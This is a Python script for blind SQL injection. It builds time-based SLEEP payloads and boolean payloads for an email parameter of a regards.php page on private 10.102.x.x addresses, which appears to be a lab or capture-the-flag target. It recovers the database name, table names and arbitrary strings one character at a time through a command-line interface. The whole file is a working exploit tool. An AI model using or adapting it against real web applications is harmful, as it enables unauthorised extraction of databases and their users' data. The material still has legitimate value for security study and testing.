#!/usr/bin/env python3

import requests
from urllib.parse import quote_plus
from time import time
from itertools import chain
from argparse import ArgumentParser


class Blind():
	def __init__(self, url='http://10.102.10.42/regards.php?email=',
				 delay=0.1, method='time', indicator=None):
		self.url = url
		self.delay = delay
		self.method = method
		if method == 'time':
			self.make_payload = self.make_time_payload
		else:
			self.make_payload = self.make_bool_payload
		self.indicator = indicator

	def send(self, payload, method='GET'):
		payload = quote_plus(payload)
		start = time()
		if method == 'GET':
			r = requests.get(self.url + payload)
		elif method == 'POST':
			r = requests.post(self.url, data=payload)

		end = time()

		return self.validate(self.method, start, end, r)

	def make_time_payload(self, cond):
		query = "' OR IF(" + cond + ",SLEEP(" + str(self.delay) + \
				"),0) AND 'a'='a"
		return query

	def make_bool_payload(self, cond):
		query = "' OR " + cond + " AND 'a'='a"
		return query

	def validate(self, method='time', start=None, end=None,
				 response=None):
		if method == 'time':
			if end - start >= self.delay:
				return True
			else:
				return False
		else:
			if self.indicator in response.text:
				return True
			else:
				return False

	def get_length(self, item):
		condition = 'LENGTH(' + item + ')={}'
		r = False
		i = 0

		while not r:
			i += 1
			payload = self.make_payload(condition.format(i))
			r = self.send(payload)

		return i

	def get_string(self, item, length=None):
		if not length:
			length = self.get_length(item)

		condition = "SUBSTRING(" + item + ",{},1)='{}'"
		string = ''

		for i in range(1, length + 1):
			r = False
			for j in chain(range(95, 127), range(65, 91), range(48, 58),
						   range(32, 48), range(58, 65), range(91, 95)):
				payload = self.make_payload(condition.format(i, chr(j)))
				r = self.send(payload)
				if r:
					break

			string += chr(j)

		return string

	def test(self, cond):
		if cond:
			return self.send(self.make_payload(cond))

	def get_db(self):
		return self.get_string('DATABASE()')

	def get_table(self, db):
		if not db:
			db = self.get_db()
		cond = "(SELECT table_name FROM information_schema.tables "
		cond += "WHERE table_schema='{}'".format(db)
		return self.get_string(cond)


def get_args():
	parser = ArgumentParser()
	parser.add_argument('-t', '--test', help='Condition to test')
	parser.add_argument('-l', '--length', help='Get length of element')
	parser.add_argument('-s', '--string', help='Get the string')
	parser.add_argument('-d', '--delay', default=0.1, type=float,
						help='Delay for time-based blind')
	parser.add_argument('-m', '--method', default='time',
						help='type of blind')
	parser.add_argument('-i', '--indicator', default='correctly set',
						help='Indicator for bool')
	parser.add_argument('-u', '--url',  help='Target URL',
						default='http://10.102.8.197/regards.php?email=')

	return parser.parse_args()


if __name__ == '__main__':
	args = get_args()
	b = Blind(url=args.url, delay=args.delay, method=args.method)

	if args.indicator:
		b.indicator = args.indicator

	# print(b.get_string('DATABASE()'))
	if args.test:
		print(b.test(args.test))
	if args.length:
		print(b.get_length(args.length))
	if args.string:
		print(b.get_string(args.string))
